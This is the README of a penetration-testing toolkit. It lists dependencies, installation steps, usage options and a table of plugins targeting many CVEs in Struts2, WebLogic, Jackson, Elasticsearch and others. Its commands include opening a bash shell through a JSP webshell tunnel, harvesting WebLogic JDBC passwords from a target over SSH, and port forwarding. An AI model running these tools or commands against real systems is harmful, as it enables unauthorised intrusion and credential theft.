[![Tweet](https://img.shields.io/twitter/url/http/Hktalent3135773.svg?style=social)](https://twitter.com/intent/follow?screen_name=Hktalent3135773) [![Follow on Twitter](https://img.shields.io/twitter/follow/Hktalent3135773.svg?style=social&label=Follow)](https://twitter.com/intent/follow?screen_name=Hktalent3135773) [![GitHub Followers](https://img.shields.io/github/followers/hktalent.svg?style=social&label=Follow)](https://github.com/hktalent/)
[![Top Langs](https://profile-counter.glitch.me/hktalent/count.svg)](https://51pwn.com)
<!-- header -->
# penetration tools
<!--

|<img src="https://github.com/hktalent/myhktools/blob/master/bin/hk1.jpg?raw=true" width=400>|<img src="https://github.com/ Hktalent/myhktools/blob/master/bin/hk2.jpg?raw=true" width=400>|
|<img src="https://github.com/hktalent/myhktools/blob/master/bin/hk3.jpg?raw=true" width=400>|<img src="https://github.com/ Hktalent/myhktools/blob/master/bin/hk4.jpg?raw=true" width=400>|
-->

## dependencies
| Command | Description |
| --- | --- |
| kali linux | recommend system |
| node js | program runtime |
| javac, java | auto generate payload |
| metasploit | auto generate payload, and autoexploit|
| gcc | auto generate payload |
| tmux | auto background send payload, shell |
Bash | base64, tr, nc, auto generate payload |
| python | auto generate and send payload |

## New features
```
# ssh2
Py2 py/rforward.py -r 192.168.10.115:8083 -p 9999 -u root 12.19.16.11:27449
Curl http://162.219.126.11:9999/QIMS/login.jsp -v

# how use exploit CVE-2018-15982

Py2 tools/replaceBin.py -i /mysvn/CVE-2018-15982_PoC.swf -o /mysvn/test.swf -c 'notepad.exe'

# get bash shell,socks4 through http tunnel,auto use tmux and reGeorgSocksProxy.py
Tools/getBashShell_proxychains_http_tunnel.sh http://xxx:9002/uddi/.O01542895480635.jsp

# check Xss
Cat /mysvn/new_url_list.txt|xargs -I % node tools/checkXss.js -v -u %
# check svn paswd
Node tools/checkSvn.js http://12.68.10.7:8090/svn/ userName Pswd

# socks5
Node tools/mySocks5.js --user mser --password W_x*d -p 15533

#one key get weblogic passwd
Ssh -i YouKey userName@YouTargetIp -p targetPort < tools/oneKeyGetSshWeblogicJdbcPswd.sh >out.txt

# port Forward
Node tools/portForward.js -l 8080,3306 --rhost 172.17.0.2 -s 127.0.0.1 -p 8111

# ssh cmd
Node tools/ssh2Cmd.js --port 29156 --host 12.8.22.48 --username root --password '#$'

# xss test
Cat /mysvn/xss.txt|grep -Eo "http.*$"|sort -u|xargs -I % node checkUrl.js -u % --tags xss

# test all urls xss
Cat /mysvn/xx.sh|grep -Eo "'([^']+)'"|xargs -I % bash -c 'curl --connect-timeout 2 -Is % -o-| head -n 1| Grep -Eo "(200|301)" && node checkUrl.js -u % --tags xss'


```
## plugins
|name|tags|dependencies|des|
| --- | --- | --- | --- |
|/bash/CVE-2014-6271.js|shellshock,web,CVE-2014-6271,rci|java,ysoserial,base64,tr|Shellshock Remote Command Injection (CVE-2014-6271)|
|/GlassFish/4.1.0.js|glassfish,web||glassfish 4.1.0 Vulnerability detection|
|/elasticsearch/CVE-2015-1427.js|elasticsearch,web,CVE-2015-1427|java,ysoserial,base64,tr|elasticsearch,web,CVE-2015-1427,RCE,ElasticSearch Groovy Sandbox bypass && code (CVE-2015-1427) test environment|
|/elasticsearch/CVE-2014-3120.js|elasticsearch,web,CVE-2014-3120|java,ysoserial,base64,tr|elasticsearch,web,CVE-2014-3120,RCE|
|/elasticsearch/CVE-2015-3337.js|CVE-2015-3337,||ElasticSearch Directory traversal vulnerability(CVE-2015-3337)test environment|
|/flask/ssti.js|ssti,flask,parms||Flask(Jinja2) Server Template Injection Vulnerability|
|/jackson/drupal_CVE-2018-7600.js|CVE-2018-7600, web, drupal|java, ysoserial, base64, tr|drupal, Vulnerability detection|
|/jackson/CVE-2017-7525.js|jackson,web,CVE-2017-7525,CVE-2017-17485|java,ysoserial,base64,tr|CVE-2017-7525,Vulnerability detection,JDK7u21,CVE-2017 -17485|
|/jackson/fastjson.js|fastjson,web,|java,ysoserial,base64,tr|fastjson,Vulnerability detection|
|/http/attackhost.js|http,host,spoof,web||spoof host,Vulnerability detection|
|/goahead/CVE-2017-17562.js|CVE-2017-17562,goahead,web|gcc,c lib,rm(/tmp/xx)|GoAhead Remote command execution vulnerability(CVE-2017-17562) Vulnerability detection|
|/java/CVE-2017-5645_log4j.js|log4j,web,CVE-2017-5645|java,ysoserial,base64,nc|CVE-2017-5645,Vulnerability detection,log4j|
|/java/CVE-2018-1297_jmeter.js|jmeter,CVE-2018-1297|java,ysoserial|jmeter,CVE-2018-1297,Vulnerability detection|
|/jboss/CVE-2017-12149.js|jboss,CVE-2017-12149|java,ysoserial|jboss,CVE-2018-1297,Vulnerability detection|
|/jdk/7u25.js|jre7,jdk7,jre1.7,jdk1.7,1.7,web,CVE-2013-0431,0431||jre7,jdk7,jre1.7,jdk1.7,1.7,webVulnerability detection, |
|/smb/CVE-2017-7494.js|smb,win,CVE-2017-7494|java,ysoserial,base64,tr|smb,win,CVE-2017-7494,Vulnerability detection|
|/spring/CVE-2018-1270.js|spring, CVE-2018-1270,1270,parms,web||spring CVE-2018-1270 RCEVulnerability detection,CVE-2018-1270: Remote Code Execution with spring-messaging|
|/spring/cve-2017-4971.js|spring,cve-2017-4971,4917,parms,web|java,ysoserial,base64,tr|spring cve-2017-4971 RCEVulnerability detection,CVE-2017-4971: Remote Code Execution Vulnerability In The Spring Web Flow Framework|
|/struts/001.js|struts2,001,ww-2030,2030,parms,web||WW-2030,struts2 001Vulnerability detection|
|/struts/005.js|struts2,005,ww-3470,xw-641,641,3470,web||WW-3470,XW-641,struts2 005Vulnerability detection|
|/struts/007.js|struts2,007,ww-3668,3668,parms||WW-3668,struts2 007Vulnerability detection|
|/struts/008.js|struts2,008,ww-3729,3729,web||WW-3729,struts2 Vulnerability detection|
|/struts/012.js|struts2,012,cve-2013-1965,parms,20131965||CVE-2013-1965,struts2 012Vulnerability detection|
|/struts/009.js|struts2,009||struts2 Vulnerability detection|
|/struts/013.js|struts2,013,parms||struts2 013Vulnerability detection|
|/struts/015.js|struts2,015||struts2 015Vulnerability detection|
|/struts/016.js|struts2,016||struts2 016Vulnerability detection|
|/struts/019.js|struts2,019||struts2 019Vulnerability detection|
|/struts/029.js|struts2,029,parms||struts2 029Vulnerability detection|
|/struts/032.js|struts2,032||struts2 032Vulnerability detection|
|/struts/037.js|struts2,037,cve-2016-4438,20164438||CVE-2016-4438,struts2 037Vulnerability detection|
|/struts/045.js|web,struts2,045,cve-2017-5638,20175638||CVE-2017-5638,struts2 045Vulnerability detection|
|/struts/033.js|struts2,033,cve-2016-3087,20163087||CVE-2016-3087,struts2 033Vulnerability detection|
|/struts/046.js|struts2,046,cve-2017-5638,20175638||CVE-2017-5638,struts2 046Vulnerability detection|
|/struts/048.js|struts2,048,cve-2017-9791,20179791,parms||CVE-2017-9791,struts2 048Vulnerability detection|
|/struts/053.js|struts2,053,parms||struts2 053Vulnerability detection|
|/struts/052.js|struts2,052||struts2 052Vulnerability detection,CVE-2017-9805|
|/struts/054.js|struts2,052||struts2 052Vulnerability detection|
|/struts/CVE-2016-100031.js|web,acf,CVE-2016-100031,fileupload,CVE-2013-2186|java,|CVE-2016-100031,CVE-2013-2186,Apache Commons FileUpload Vulnerability detection |
|/struts/055.js|struts2,055,CVE-2017-7525,7525,parms|javac|struts2 055Vulnerability detection,|
|/struts/057.js|web,struts2,057||CVE-2018-11776,struts2 057Vulnerability detection|
|/struts/devMode.js|struts2,devMode||struts2 devModeVulnerability detection|
|/struts/ognl.js|struts2,parms,ognl||struts2 052Vulnerability detection|
|/struts/pythonBc.js|struts2, python|python,struts-scan.py|struts2 python script Vulnerability detection supplement|
|/tomcat/CVE-2016-6816.js|tomcat,CVE-2016-6816||Apache Tomcat CVE-2016-6816 Security Bypass Vulnerability Vulnerability detection|
|/tomcat/CVE-2017-12616.js|tomcat,CVE-2017-12616,12616,CVE-2017-12617||tomcat,Vulnerability detection|
|/weblogic/SSRF.js|ssrf, weblogic, uddi, xspa||SSRF Open State Monitoring, CVE-2014-4210, UDDI Explorer, CVE-2014-4241, CVE-2014-4242)|
|/weblogic/201710271.js|weblogic,CVE-2017-10271,10271,3506|payload/[x.jsp,*.sh],msfvenom,curl|CVE-2017-10271,weblogic CVE-2017-10271,CVE -2017-3506Vulnerability detection|
|/weblogic/t3.js|t3, weblogic||T3 open state monitoring|
|/xss/xss1.js|xss,parms,web||xx,Vulnerability detection|


## how install
```
# mac os
Brew install node
# linux
Apt install nodejs node
Yum install nodejs node

Mkdir ~/safe && cd ~/safe
Git clone https://github.com/hktalent/myhktools.git
Cd myhktools
Sh ./install.sh
Node checkUrl.js -h
```

## update all node js lib
```
Vi ~/npm-upgrade.sh

#!/bin/sh
Set -e
#set -x
For package in $(npm -g outdated --parseable --depth=0 | cut -d: -f2)
Do
    Npm -g install "$package"
Done
```
## upgrade all npm
```
Sh ~/npm-upgrade.sh
```
## how use
Node checkUrl.js -h
```
Usage: checkUrl [options]

  Options:

    -V, --version output the version number
    -u, --url [value] check url, no default
    -p, --proxy [value] http proxy,eg: http://127.0.0.1:8080, or https://127.0.0.1:8080, no default, set the proxy
    -t, --t3 [value] check weblogic t3, default false, check the T3 protocol, you can specify a list of file names to detect
    -i, --install install node modules,run: npm install
    -v, --verbose show logs
    -w, --struts2 [value] struts2 type,eg: 045
    -C, --cmd [value] cmd type,eg: "ping -c 3 www.baidu.com"
    -o, --timeout default 5000
    -l, --pool default 300
    -r, --test test
    -x, --proxy http://127.0.0.1:8800
    -m, --menu [value] scan url + menus, default ./urls/ta3menu.txt
    -s, --webshell [value] scan webshell url, set parameters will run, default ./urls/webshell.txt
    -d, --method [value] default PUT, DELETE, OPTIONS, HEAD, PATCH test
    -a, --host host attack test, this function may not be available after setting the proxy, default true
    -k, --keys [value] scan html keywords, default ./urls/keywords
    -h, --help output usage information

Node checkUrl.js -u http://192.168.10.216:8082/s2-032/ --struts2 045

............

```

<!--

<img src="https://github.com/hktalent/myhktools/blob/master/bin/wb1.jpg?raw=true" width=400>
-->

<!-- ender -->
# Donation
# Donation
| Wechat Pay | AliPay | Paypal | BTC Pay |BCH Pay |
| --- | --- | --- | --- | --- |
|<img src=https://github.com/hktalent/myhktools/blob/master/md/wc.png>|<img width=166 src=https://github.com/hktalent/myhktools/blob/master/md/zfb.png>|[paypal](https://www.paypal.me/pwned2019) **miracletalent@gmail.com**|<img width=166 src=https://github.com/hktalent/myhktools/blob/master/md/BTC.png>|<img width=166 src=https://github.com/hktalent/myhktools/blob/master/md/BCH.jpg>|

# Thanks to
- [![Follow on Twitter](https://img.shields.io/twitter/follow/hanerkui.svg?style=social&label=Follow)](https://twitter.com/intent/follow?screen_name=hanerkui ) github: [hanerkui] (https://github.com/hanerkui)
- [![Follow on Twitter](https://img.shields.io/twitter/follow/pwncrestfallen.svg?style=social&label=Follow)](https://twitter.com/intent/follow?screen_name=pwncrestfallen ) github:[musicalpike](https://github.com/musicalpike)
- [![Follow on Twitter](https://img.shields.io/twitter/follow/tiger_mirror.svg?style=social&label=Follow)](https://twitter.com/intent/follow?screen_name=tiger_mirror ) github: [black-mirror](https://github.com/black-mirror)
- [![Follow on Twitter](https://img.shields.io/twitter/follow/Arthur22573102.svg?style=social&label=Follow)](https://twitter.com/intent/follow?screen_name=Arthur22573102 ) github: [EnterpriseForever] (https://github.com/EnterpriseForever)

 
# 先知论坛推荐过本项目“2.1.3 Web 框架”
https://xz.aliyun.com/t/2354?page=34
# myhktools
